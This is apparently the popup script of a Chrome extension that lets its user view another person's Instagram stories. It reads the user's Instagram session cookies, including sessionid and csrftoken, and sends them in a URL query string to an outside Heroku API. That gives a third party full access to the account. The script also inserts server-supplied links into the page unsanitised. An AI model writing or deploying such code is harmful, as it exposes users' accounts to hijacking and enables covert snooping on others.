let loginForm = document.getElementById("login-form");
const loginButton = document.getElementById("form-submit");
const loginErrorMsg = document.getElementById("login-error-msg");
const loader = document.getElementById("loader");
const cookies = [];
const notLoggedMsg = `
    <h3>Log in to</h3>
    <a id="form-submit" target="_blank" href="https://www.instagram.com/"><span></span>
        <span></span>
        <span></span>
        <span></span>
        <span></span>
        Instagram
    </a>`
async function getCookies(domain, listName, callback) {
        listName.map((name) => chrome.cookies.get({"url": domain, "name": name},  function(cookie) {
            try{
                if(callback) {
                    callback(name + "=" + cookie.value + ";");
                }
            } catch(e){
                if (e.name === "TypeError"){
                    loginForm.innerHTML = notLoggedMsg
                }
            }
        }));    

}
getCookies("https://instagram.com", ["ig_did","mid", "datr", "ig_nrcb", "dpr" , "shbid","ds_user_id", "csrftoken", "rur", "sessionid"], function(id) {
    cookies.push(id);
});

async function getCurrentTab() {
    let queryOptions = { active: true, lastFocusedWindow: true };
    // `tab` will either be a `tabs.Tab` instance or `undefined`.
    let [tab] = await chrome.tabs.query(queryOptions);
    if (tab.url != undefined){
        if (tab.url.includes("instagram.com")){
            return
        } else {
            loginForm.innerHTML = notLoggedMsg
        }
    } else {
        loginForm.innerHTML = notLoggedMsg
    }
   
    return tab;
  }
console.log(getCurrentTab())
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    
    loader.classList.add('backgroundAnimation')
    loader.classList.add('loader')
    const username = loginForm[0].value;
    const url = `https://insta-spy-api.herokuapp.com/api/v1/getStories?username=${username}&cookies=${cookies.join('')}`;
    const saveData = fetch(url)
    .then((data) => data.json())
    .then((response) => {
        loginForm = document.getElementById("login-form");
        console.log(response.data)
        allStories =response.data.stories;

        let data = '';
        if (undefined === allStories){
            data = "<li><a>No stories available</a></li>"
        } else {
            for (let i = 0; i < allStories.length; i++){
                console.log(i);
                data = data + `<li>\n\t<a target="_blank" href="${allStories[i]}}">${i+1}</a></li>`
                console.log(data)
            }
        }
        loginForm.innerHTML = `<ul>${data}</ul>`
        loader.classList.remove('backgroundAnimation')
        loader.classList.remove('loader')
    });
});